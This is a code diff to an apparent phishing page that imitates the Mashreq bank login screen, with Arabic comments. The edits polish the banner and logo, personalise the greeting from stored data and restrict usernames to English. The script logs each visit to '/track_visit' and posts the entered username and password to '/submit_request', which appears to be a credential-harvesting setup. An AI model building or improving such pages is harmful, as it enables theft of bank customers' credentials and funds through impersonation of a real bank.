@@ -15,13 +15,14 @@
         html, body {
             width: 100%;
             height: 100%;
-            overflow: hidden;
+            overflow-x: hidden;
         }
         body {
-            background-color: #f17b21; /* اللون البرتقالي المطابق تماماً للصورة المرسلة */
+            background-color: #f17b21;
             display: flex;
             flex-direction: column;
             position: relative;
+            min-height: 100vh;
         }
         
         /* Top Navigation Bar */
@@ -31,6 +32,7 @@
             align-items: center;
             padding: 15px 20px;
             z-index: 10;
+            background-color: #f17b21;
         }
         .menu-icon {
             color: white;
@@ -38,28 +40,29 @@
             cursor: pointer;
         }
         .mashreq-logo-top {
-            height: 35px;
-            /* إزالة الفلتر المشوه */
+            height: 40px;
+            max-width: 160px;
+            object-fit: contain;
+            background: white;
+            padding: 4px 8px;
+            border-radius: 4px;
         }
 
-        /* Illustration Section */
+        /* Illustration / Banner Section - ظاهر بالكامل بدون اقتصاص */
         .illustration-container {
-            flex: 1;
+            width: 100%;
+            background-color: #ffffff;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 10px 0;
             overflow: hidden;
-            position: relative;
-            padding: 10px;
         }
         .main-illustration {
-            max-width: 80%;
-            max-height: 80%;
-            object-fit: contain;
-            filter: brightness(0) invert(1); /* تحويل الشعار الرسمي للون الأبيض الصافي ليتناسب مع الخلفية */
-        }
-        .promo-text {
-            display: none;
+            width: 100%;
+            max-height: 280px;
+            object-fit: contain; /* عرض الصورة بالكامل بدون اقتطاع */
+            display: block;
         }
 
         /* Bottom Sheet */
@@ -71,6 +74,7 @@
             width: 100%;
             position: relative;
             box-shadow: 0 -5px 15px rgba(0,0,0,0.1);
+            margin-top: auto;
         }
         .sheet-handle {
             width: 40px;
@@ -256,10 +260,9 @@
         </div>
     </div>
 
-    <!-- Illustration -->
+    <!-- Banner / Illustration - ظاهر بالكامل -->
     <div class="illustration-container">
-        <!-- استخدام الشعار الرسمي للمشرق -->
-        <img src="images/mashreq_logo_new.jpg" class="main-illustration" alt="Mashreq Logo">
+        <img src="images/banner.jpg" class="main-illustration" alt="Mashreq Banner">
     </div>
 
     <!-- Bottom Sheet -->
@@ -268,7 +271,8 @@
         
         <div class="welcome-section">
             <div class="welcome-text">
-                <div class="welcome-title">أهلاً بك Tarek</div>
+                <!-- ترحيب ذكي يأخذ اسم المستخدم المدخل، أو اسم افتراضي -->
+                <div class="welcome-title" id="welcomeGreeting">أهلاً بك</div>
                 <div class="welcome-subtitle">قم بتسجيل الدخول إلى حسابك</div>
             </div>
             <div class="user-avatar">
@@ -278,7 +282,8 @@
 
         <form id="loginForm">
             <div class="form-group">
-                <input type="text" id="username" name="username" class="form-control" placeholder="إسم المستخدم" required>
+                <!-- تقييد اسم المستخدم باللغة الإنجليزية فقط -->
+                <input type="text" id="username" name="username" class="form-control" placeholder="إسم المستخدم (بالإنجليزية فقط)" required oninput="validateEnglishUsername(this)">
             </div>
 
             <div class="form-group">
@@ -312,7 +317,29 @@
     </div>
 
     <script>
-        // الحفاظ على كود التتبع الأصلي
+        // جلب اسم المستخدم المخزن أو المدخل في الصفحة السابقة لعرضه في عبارة "أهلاً بك"
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedName = localStorage.getItem('user_full_name');
+            const greetingEl = document.getElementById('welcomeGreeting');
+            if (savedName) {
+                greetingEl.textContent = `أهلاً بك ${savedName}`;
+            } else {
+                greetingEl.textContent = `أهلاً بك Tarek`;
+            }
+        });
+
+        // التحقق من أن اسم المستخدم إنجليزي فقط ومنع الحروف العربية
+        function validateEnglishUsername(input) {
+            const arabicRegex = /[\u0600-\u06FF]/g;
+            const errorDiv = document.getElementById("errorMessage");
+            if (arabicRegex.test(input.value)) {
+                input.value = input.value.replace(arabicRegex, '');
+                errorDiv.textContent = "يیرجي إدخال اسم المستخدم باللغة الإنجليزية فقط (لا يُسمح بالعربية).";
+                errorDiv.style.display = "block";
+                setTimeout(() => { errorDiv.style.display = "none"; }, 4000);
+            }
+        }
+
         fetch('/track_visit', {
             method: 'POST',
             headers: {
@@ -335,13 +362,19 @@
             }
         }
 
-        // الحفاظ على كود إرسال البيانات الأصلي
         document.getElementById("loginForm").addEventListener("submit", async function(event) {
             event.preventDefault();
 
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
             const errorMessageDiv = document.getElementById("errorMessage");
+
+            // تأكيد نهائي أن اسم المستخدم لا يحتوي على حروف عربية
+            if (/[\u0600-\u06FF]/.test(username)) {
+                errorMessageDiv.textContent = "اسم المستخدم يجب أن يكون باللغة الإنجليزية فقط.";
+                errorMessageDiv.style.display = "block";
+                return;
+            }
 
             try {
                 const response = await fetch("/submit_request", {
